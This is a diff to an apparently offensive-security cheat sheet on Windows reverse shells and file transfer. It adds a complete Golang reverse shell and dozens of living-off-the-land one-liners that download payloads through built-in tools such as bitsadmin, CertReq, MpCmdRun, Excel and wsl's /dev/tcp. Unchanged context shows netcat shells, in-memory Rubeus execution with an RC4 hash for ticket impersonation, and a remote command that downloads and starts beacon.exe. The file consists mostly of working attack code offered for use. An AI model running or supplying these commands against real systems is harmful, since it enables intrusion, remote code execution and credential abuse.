@@ -1,4 +1,4 @@
-github# Reverse shell
+# Reverse shell
 ## Netcat Traditional
 ```shell
 nc -e cmd.exe 10.0.0.1 4242
@@ -91,6 +91,53 @@ main() {
       socket.destroy();
     });
   });
+}
+```
+# Golang
+```
+package mainimport (  
+ "bufio"  
+ "flag"  
+ "fmt"  
+ "net"  
+ "os"  
+ "os/exec"  
+ "runtime"  
+)func get\_arch\_message_format(msg string) (string, \[\]string) {  
+ var exe string  
+ os := runtime.GOOS  
+ switch os {  
+ case "windows":  
+  exe = "cmd"  
+ case "linux":  
+  exe = "/bin/sh"  
+ }  
+ args := \[\]string{}  
+ if exe == "cmd" {  
+  args = append(args, "/C")  
+ } else {  
+  args = append(args, "-c")  
+ }  
+ args = append(args, msg)  
+ return exe, args  
+}func main() {args := os.Args  
+ if len(args) < 2 {  
+  fmt.Println("Not enough arguments!")  
+  fmt.Println("Usage: app -i 10.10.10.10 -p 8089")  
+  return  
+ }I_P := flag.String("i", "", "Host to connect to")  
+ L_PORT := flag.String("p", "", "Port to listen on")  
+ flag.Parse()conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", \*I\_P, \*L\_PORT))for {  
+  cwd, _ := os.Getwd()  
+  fmt.Fprintf(conn, "\\n%s> ", cwd)  
+  msg, _ := bufio.NewReader(conn).ReadString('\\n')  
+  exe, args := get\_arch\_message_format(msg)  
+  out, err := exec.Command(exe, args...).Output()  
+  if err != nil {  
+   fmt.Println(conn, "\\n\\n%s\\n", err)  
+  }  
+  fmt.Fprintf(conn, "%s", out)  
+ }  
 }
 ```
 ## MsfVenom
@@ -255,23 +302,28 @@ powershell IEX(New-Object Net.Webclient).downloadstring('http://<attacker-ip>:<a
 ```
 powershell -noexit -file "C:\path\to\script.ps1"
 ```    
-To bypass execution policy:
+Bypass execution policy:
 ```
 powershell -executionPolicy bypass -noexit -file "C:\path\to\script.ps1"
 ```
-To run with arguments:
+Run with arguments:
 ```
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
 ```
-To execute a specific method from an assembly:
+Execute a specific method from an assembly:
 ```
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll')
 $assem = [System.Reflection.Assembly]::Load($data)
 $class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
+```
+### CertReq
+#### Downloading files
+```
+CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
 ```
 ### CertUtil
 #### Downloading files
@@ -292,9 +344,17 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```
 bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe
 ```
+```
+bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+```
 #### Running a script from remote host
 ```
 bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
+```
+### Desktopimgdownldr
+#### Downloading files
+```
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
 ```
 ### VBS Script
 #### Downloading files
@@ -395,7 +455,93 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
+### Diantz
+#### Downloading files
+```
+diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
+```
+### Esentutl
+#### Downloading files
+```
+esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
+```
+### Expand
+#### Downloading files
+```
+expand \\webdav\folder\file.bat c:\ADS\file.bat
+```
+### Extrac32
+#### Downloading files
+```
+extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
+```
+### Findstr
+#### Downloading files
+```
+findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
+```
+### GfxDownloadWrapper
+#### Downloading files
+```
+C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
+```
+### Hh
+#### Downloading files
+```
+HH.exe http://some.url/script.ps1
+```
+### leexec
+#### Downloading files
+```
+ieexec.exe http://x.x.x.x:8080/bypass.exe
+```
+### Makecab
+#### Downloading files
+```
+makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
+```
+### MpCmdRun
+#### Downloading files
+```
+MpCmdRun.exe -DownloadFile -url <URL> -path <path> //Windows Defender executable
+```
+### Replace
+#### Downloading files
+```
+replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
+```
+### Excel
+#### Downloading files
+```
+Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
+```
+### Powerpnt
+#### Downloading files
+```
+Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+```
+### Squirrel
+#### Downloading files
+```
+squirrel.exe --download [url to package]
+```
+### Update
+#### Downloading files
+```
+Update.exe --download [url to package]
+```
+### Winword
+#### Downloading files
+```
+winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+```
+### Wsl
+#### Downloading files
+```
+wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+```
 ### Debug.exe (Windows 32bits)
+#### Downloading files
 This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
 
 `Debug.exe` can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:
@@ -712,6 +858,14 @@ Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
 # Check the result of the command to confirm we have an interactive session
 Invoke-Command -Session $sess -ScriptBlock {$ps}
 ```
+Import a powershell module and execute its functions remotely:
+``` 
+#Execute the command and start a session
+Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 
+
+#Interact with the session
+Enter-PSSession -Session $sess
+```
 Donwnload and execute exploit remotely in one line:
 ```
 Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri 'http://10.10.10.10/beacon.exe' -OutFile 'C:\Temp\beacon.exe'; Start-Process -wait C:\Temp\beacon.exe}
@@ -739,3 +893,4 @@ net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
 
 [Transfering files on Windows · Total OSCP Guide (gitbooks.io)](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)
 
+[Get Reverse-shell via Windows one-liner – Hacking Articles](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
